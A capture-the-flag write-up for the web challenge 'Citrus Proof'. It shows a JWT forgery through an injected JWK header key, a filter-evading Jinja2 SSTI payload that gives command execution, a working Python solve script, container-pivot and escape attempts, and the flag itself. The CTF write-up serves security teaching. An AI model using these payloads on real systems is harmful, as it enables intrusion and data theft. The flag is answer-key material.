---
title: "Citrus Proof"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: hard
points: 750
flag_format: "safctf{...}"
author: "Strawhats"
---

# Citrus Proof

> **Category:** WEB · **Points:** 750 · **Difficulty:** hard

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- **Target:** `http://54.72.82.22:8320` — Werkzeug/3.1.9, Python/3.11.16, Flask (dev server)

## The solve

The role gate was never a secret-cracking problem. The server **trusts a signing
key supplied in the JWT header itself** — a JWK header-injection / self-signed-JWT
bug. The header may carry `{"jwk": {"k": "<base64 key>"}}`; the verifier then uses
*that* key instead of a server-side secret. So anyone can mint a "valid"
`{"role":"curator"}` token by signing with a key of their own choosing.

Where the leak came from: the **sibling challenge *Touchline Dispatch* (`:8300`,
already solved)** has a path traversal that reads `/app/service.py`. Same
organizer runtime, so its source is shared — it shows the verifier verbatim:

```python
def claims():
    token = request.headers.get('Authorization','').removeprefix('Bearer ')
    h,p,s = token.split('.')
    head  = json.loads(unb64(h))
    key   = unb64(head['jwk']['k']) if 'jwk' in head else b'front-desk'
    if not hmac.compare_digest(unb64(s), hmac.new(key,(h+'.'+p).encode(),sha256).digest()):
        raise ValueError('signature')
    return json.loads(unb64(p))
```

Once curator, `POST /api/proof` renders the supplied `layout` with
`render_template_string` — Jinja2 SSTI — but **rejects layouts containing any of
`_`, `[`, `]`**. The filter is dodged by pulling the attribute names and the
command out of the **query string** (query args are not filtered) and using
`|attr()`:

```
{{lipsum|attr(request.args.g)|attr('get')(request.args.m)|attr(request.args.f)(request.args.c)|attr('read')()}}
```

with `?g=__globals__&m=os&f=popen&c=<cmd>` → RCE. The flag is in the container
env (`FLAG=...`) and is also written to `/app/private/reserve.txt` at startup.

## `/submit` is a decoy here

Do not chase it. `/submit` compares `sha256(answer)` against `cfg['answer_hash']`,
but Citrus Proof's `/app/settings.json` **has no `answer_hash` key**, so the
fallback `'!'` can never match — `/submit` returns 403 for *every* input by
construction. The env / `reserve.txt` value IS the flag. Posting it to `/submit`
still returns 403 (confirmed).

## Reproduce

```sh
/home/nomad/safaricom_ctf/.venv/bin/python chal/web/citrus-proof/solve.py
# [*] forged curator, {{7*7}} -> 200 {"proof":"49"}
# [*] /app/private/reserve.txt -> 'safctf{83f575a861a0c69d675d700dcb658cd2}'
# [+] FLAG: safctf{83f575a861a0c69d675d700dcb658cd2}
```

## App surface

```
GET  /              static landing page, no reflection
POST /api/session   -> 200 {"token": "<JWT>"}   (method-agnostic)
POST /api/proof     -> needs Bearer <curator JWT>; body {"layout": "..."}
POST /submit        -> dict body {"answer": "..."}   (decoy: no answer_hash)
GET  /health        -> {"status":"ok"}
```

## Dead ends — already exhausted, do NOT repeat

The token is hand-rolled HS256 (`json.dumps` spacing, PyJWT would not emit the
spaces), payload always `{"role":"visitor"}`, byte-identical every call.

Offline key recovery, all **negative**: rockyou (14.3M); jwt-secrets (104k) + xato
1M; brute `[a-z0-9]{1..5}` (62,193,780 keys); brute `[a-zA-Z0-9]{1..4}`
(15,018,570 keys); theme/leet generator (17,728 keys); framework-id keys; every
double-base64 taunt string in the repo (902 literals); token-derived keys;
alternate HMAC formulas; `kid`/`jku`/`x5u` as key (400).

Also negative: `alg:none`/`None`/`NONE`, empty signature, signature truncation,
signature-coverage gaps (all 400 — so signature verification itself is sound);
role override by body/header/query/cookie (`/api/session` always mints
`visitor`); debug mode off (no Werkzeug console).

Container pivot (via Ginger Juice Shop `:8050` root RCE) reached container
`54820c139049` on `172.16.5.2/24` — a plain flask image on its **own bridge**,
Citrus not on that network, so `/app/app.py` was unreachable from there. Host
escape blocked by the device cgroup (mknod succeeds, raw read EPERM; no
CAP_SYS_ADMIN, no docker.sock, no open_by_handle_at).

**The lesson:** the secret was never on this box. It was in a *sibling
challenge's* leaked source. When one challenge in a family has a source leak, that
leak describes the whole family's runtime — check it before brute-forcing.

## Solve script

`web/citrus-proof/solve.py`:

```python
#!/usr/bin/env python3
"""Citrus Proof - WEB, 550 pts - SOLVED.

Target: http://54.72.82.22:8320   (Werkzeug/3.1.9, Python 3.11.16, Flask)

Flag: safctf{83f575a861a0c69d675d700dcb658cd2}

The role gate is NOT a secret-cracking problem.  The organizer runtime leaks the
whole framework in the sibling desk app Touchline Dispatch (:8300), whose
path-traversal reads /app/service.py:

    def claims():
        token = request.headers.get('Authorization','').removeprefix('Bearer ')
        h,p,s = token.split('.')
        head  = json.loads(unb64(h))
        key   = unb64(head['jwk']['k']) if 'jwk' in head else b'front-desk'   # <-- pick your own key
        if not hmac.compare_digest(unb64(s), hmac.new(key,(h+'.'+p).encode(),sha256).digest()):
            raise ValueError('signature')
        return json.loads(unb64(p))

Put {"jwk":{"k":<b64 key>}} in the JWT header and sign with that key -> a fully
"valid" {"role":"curator"} token (JWK header injection / self-signed JWT).

    kind == 'web-render':
        op == 'session' -> issue({'role':'visitor'})            # constant visitor token
        op == 'proof'   -> role must be 'curator', then render_template_string(layout),
                           rejecting layouts containing any of '_' '[' ']'

So /api/proof is a Jinja2 SSTI once curator.  The '_' filter is dodged by pulling
the attribute name and the command from the query string (query args are not
filtered) and using |attr():
    {{lipsum|attr(request.args.g)|attr('get')(request.args.m)|attr(request.args.f)(request.args.c)|attr('read')()}}
with ?g=__globals__&m=os&f=popen&c=<cmd>  -> root RCE.

FLAG lives in the env of the container (FLAG=...) and is also written to
/app/private/reserve.txt at startup (service.py does that for web-path/web-render).

NOTE: POST /submit is a decoy on this challenge.  /submit compares
sha256(answer) to cfg['answer_hash'], but Citrus Proof's /app/settings.json has no
'answer_hash' key, so the fallback '!' can never match -- /submit returns 403 for
every input by construction.  The env/reserve.txt value IS the flag.
"""
import base64, hashlib, hmac, json, sys, urllib.parse, urllib.request, urllib.error

BASE = "http://54.72.82.22:8320"
EXPECT = "safctf{83f575a861a0c69d675d700dcb658cd2}"

def b64(b): return base64.urlsafe_b64encode(b).decode().rstrip("=")

def req(method, path, body=None, token=None, params=None):
    url = BASE + path
    if params:
        url += "?" + urllib.parse.urlencode(params)
    data = body.encode() if isinstance(body, str) else body
    h = {"Content-Type": "application/json"}
    if token:
        h["Authorization"] = "Bearer " + token
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=15) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")

def forge(role="curator", key=b"pwn"):
    """JWK-header key injection: the server trusts the key we put in the header."""
    head = {"alg": "HS256", "typ": "JWT", "jwk": {"k": b64(key)}}
    h = b64(json.dumps(head).encode())
    p = b64(json.dumps({"role": role}).encode())
    s = b64(hmac.new(key, (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + s

SSTI = ("{{lipsum|attr(request.args.g)|attr('get')(request.args.m)"
        "|attr(request.args.f)(request.args.c)|attr('read')()}}")

def run(cur, cmd):
    st, txt = req("POST", "/api/proof", json.dumps({"layout": SSTI}), cur,
                  {"g": "__globals__", "m": "os", "f": "popen", "c": cmd})
    if st == 200:
        return json.loads(txt).get("proof", "")
    return None

def main():
    cur = forge()
    st, txt = req("POST", "/api/proof", '{"layout":"{{7*7}}"}', cur)
    print("[*] forged curator, {{7*7}} ->", st, txt.strip())
    assert st == 200 and "49" in txt, "jwk forgery failed"

    out = run(cur, "cat /app/private/reserve.txt")
    flag = out.strip() if out else ""
    print("[*] /app/private/reserve.txt ->", repr(flag))
    if "safctf{" not in flag:
        env = run(cur, "printenv FLAG") or ""
        m = env.strip()
        flag = m[m.index("safctf{"):].split("}")[0] + "}" if "safctf{" in m else ""
        print("[*] env FLAG ->", repr(flag))

    print("[+] FLAG:", flag)
    assert flag == EXPECT, f"unexpected flag {flag!r}"

    # /submit is a decoy here (settings.json has no answer_hash)
    st, txt = req("POST", "/submit", json.dumps({"answer": flag}))
    print("[*] /submit (decoy, always 403):", st, txt.strip())
    return 0

if __name__ == "__main__":
    sys.exit(main())
```

## Tools

**Used in this solve:**

- `base64`
- Python 3 (solver)

**Other tools that fit this category:**

- Burp Suite / mitmproxy (intercept + repeat)
- ffuf / feroxbuster (content & parameter discovery)
- sqlmap (automated SQLi)
- tplmap (SSTI)
- jwt_tool (JWT attacks)
- nikto
- nuclei

## Flag

```
safctf{83f575a861a0c69d675d700dcb658cd2}
```
